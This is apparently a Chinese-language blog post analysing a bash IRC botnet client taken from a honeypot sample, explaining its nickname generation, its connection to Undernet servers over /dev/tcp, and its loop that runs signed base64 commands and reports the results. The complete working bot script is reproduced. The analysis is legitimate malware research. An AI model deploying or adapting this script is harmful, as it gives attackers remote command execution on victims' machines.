ailx10说：这篇是我2024年6月写的。拿到那份样本以后，我又沿着 IRC 部分追下去，甚至进了它的聊天室，看见里面出现的 Bot。后来服务端增加认证，新来的连接会被踢掉，频道也就慢慢没了动静。我把这段经历和代码放在一起，去看昵称怎么生成、怎样连服务器、发 NICK 和 USER、响应 PING、收命令再回传。以前像古早技术的 IRC，这次在样本里突然变得很具体。文章留下的既有协议流程，也有一个通信地点来得快、变得也快的现场。

---

本文分析蜜罐样本中的 IRC 通信逻辑。原文观察到频道成员和连接被拒，但不能据此确认成员身份、设备状态或频道是否废弃。

![](/notes-assets/cd920c2ca7df567db6f1.webp)

1、脚本对系统信息计算摘要并截取一段作为昵称；该昵称不保证全局唯一。

```
SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
```

![](/notes-assets/16a6f479710af8649d33.webp)

**2、服务器列表和随机选择服务器：**这里定义了一个IRC服务器列表，并随机选择其中一个服务器来连接

```
arr[0]="ix1.undernet.org"
arr[1]="ix2.undernet.org"
arr[2]="Ashburn.Va.Us.UnderNet.org"
arr[3]="Bucharest.RO.EU.Undernet.Org"
arr[4]="Budapest.HU.EU.UnderNet.org"
arr[5]="Chicago.IL.US.Undernet.org"
rand=$[$RANDOM % 6]
svr=${arr[$rand]}
```

![](/notes-assets/110524f9962e275806da.webp)

**3、建立与服务器的TCP连接：**使用`eval`和`exec`命令与选定的服务器建立TCP连接。如果连接失败，循环重新选择服务器并尝试连接

```
eval 'exec 3<>/dev/tcp/$svr/6667;'
if [[ ! "$?" -eq 0 ]] ; then
    continue
fi
```

4、发送 NICK 和 USER 命令注册 IRC 会话；它们本身不构成强身份认证。

```
eval 'printf "NICK $NICK
" >&3;'
eval 'printf "USER user 8 * :IRC hi
" >&3;'
```

**5、进入主循环：**不断读取服务器发送的消息

```
while [ true ]; do
    eval "read msg_in <&3;"
    if [[ ! "$?" -eq 0 ]] ; then
        break
    fi
```

**6、处理PING消息：**当接收到PING消息时，发送PONG响应并加入频道`#biret`

```
if  [[ "$msg_in" =~ "PING" ]] ; then
    printf "PONG %s
" "${msg_in:5}";
    eval 'printf "PONG %s
" "${msg_in:5}" >&3;'
    sleep 1
    eval 'printf "JOIN #biret
" >&3;'
```

**7、处理PRIVMSG消息：**当接收到PRIVMSG消息时，脚本会提取消息内容和发送者昵称，并对消息进行验证。消息内容是Base64编码的，解码后生成其MD5哈希值，与签名进行对比验证。如果验证通过，则执行解码后的命令，并将执行结果以Base64编码后发送回去

```
elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
    privmsg_h=$(echo $msg_in| cut -d':' -f 3)
    privmsg_data=$(echo $msg_in| cut -d':' -f 4)
    privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

    hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
    sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

    if [[ "$sign" == "$hash" ]] ; then
        CMD=`echo $privmsg_data | base64 -d -i`
        RES=`bash -c "$CMD" | base64 -w 0`
        eval 'printf "PRIVMSG $privmsg_nick :$RES
" >&3;'
    fi
```

IRC C2脚本如下：

```
#!/bin/bash

SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

	arr[0]="ix1.undernet.org"
	arr[1]="ix2.undernet.org"
	arr[2]="Ashburn.Va.Us.UnderNet.org"
	arr[3]="Bucharest.RO.EU.Undernet.Org"
	arr[4]="Budapest.HU.EU.UnderNet.org"
	arr[5]="Chicago.IL.US.Undernet.org"
	rand=$[$RANDOM % 6]
	svr=${arr[$rand]}

	eval 'exec 3<>/dev/tcp/$svr/6667;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

	echo $NICK

	eval 'printf "NICK $NICK
" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi
	eval 'printf "USER user 8 * :IRC hi
" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi

	# Main loop
	while [ true ]; do
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

		if  [[ "$msg_in" =~ "PING" ]] ; then
			printf "PONG %s
" "${msg_in:5}";
			eval 'printf "PONG %s
" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1
			eval 'printf "JOIN #biret
" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
		elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
			privmsg_h=$(echo $msg_in| cut -d':' -f 3)
			privmsg_data=$(echo $msg_in| cut -d':' -f 4)
			privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

			hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
			sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

			if [[ "$sign" == "$hash" ]] ; then
				CMD=`echo $privmsg_data | base64 -d -i`
				RES=`bash -c "$CMD" | base64 -w 0`
				eval 'printf "PRIVMSG $privmsg_nick :$RES
" >&3;'
				if [[ ! "$?" -eq 0 ]] ; then
					break
				fi
			fi
		fi
	done
done
```

名字相似不证明同一台机器，注册命令也不等于强身份验证。把通信协议与控制逻辑分别读清，才能判断哪一条消息真正改变了主机状态。
